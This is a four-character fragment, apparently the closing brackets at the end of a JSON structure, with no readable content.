e}]}